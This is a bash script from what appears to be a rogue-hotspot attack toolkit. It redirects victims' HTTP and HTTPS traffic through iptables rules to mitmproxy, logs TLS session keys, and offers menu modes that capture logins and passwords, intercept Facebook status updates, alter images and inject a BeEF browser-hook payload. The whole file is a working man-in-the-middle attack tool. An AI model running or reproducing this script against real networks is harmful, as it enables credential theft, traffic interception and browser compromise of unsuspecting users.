#!/bin/bash
THISPATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd)"
source $THISPATH/setup.conf 


function enable_redirects()
{
  iptables -t nat -A PREROUTING -m mark ! --mark 99 -p tcp ! -d $interface_hotspot_ip --dport 80 -j REDIRECT --to-port 8443
  iptables -t nat -A PREROUTING -m mark ! --mark 99 -p tcp ! -d $interface_hotspot_ip --dport 443 -j REDIRECT --to-port 8443
}

function disable_redirects()
{
  iptables -t nat -D PREROUTING -m mark ! --mark 99 -p tcp ! -d $interface_hotspot_ip --dport 80 -j REDIRECT --to-port 8443
  iptables -t nat -D PREROUTING -m mark ! --mark 99 -p tcp ! -d $interface_hotspot_ip --dport 443 -j REDIRECT --to-port 8443
}


function start_mitm
{
  export MITMPROXY_SSLKEYLOGFILE=$LOGDIR/SSLkey.log
	
  #clear
  option=0
  until [ "$option" = "99" ]; do
  echo "Select MITM-Proxy mode"
  echo "======================"
  echo
  echo "  (1) Start MITM-Proxy interactive"
  echo "  (2) Start MITM-Proxy (captue logins, intercept facebook updatestatus)"
  echo "  (3) Start mitmdump - Turning pictures to black-and-white and mark with payload"
  echo "  (4) Start mitmdump - Injecting BeEF-Hook (EXPERIMENTAL)"

  echo -n "Enter choice: "
  read option
  echo ""

  case $option in
        1 ) enable_redirects; mitmproxy -p 8443 -T --cadir ./cert/ --host --stream 100k; break;;
        2 ) enable_redirects; mitmproxy -p 8443 -T --cadir ./cert/ --host -f "login | Login | updatestatus | sl/password" -i "updatestatus"; break ;;
        3 ) enable_redirects; mitmdump -p 8443 -T --cadir ./cert/ --host -s $THISPATH/mitmproxy-scripts/mark_pictures.py --anticache; break ;;
        4 ) enable_redirects; mitmdump -p 8443 -T --cadir ./cert/ --host -s $THISPATH/mitmproxy-scripts/modify_response_header_beef.py --anticache; break ;;
        * ) echo "Please enter 1, 2, 3 or 4";;
  esac
 done
}


start_mitm
disable_redirects
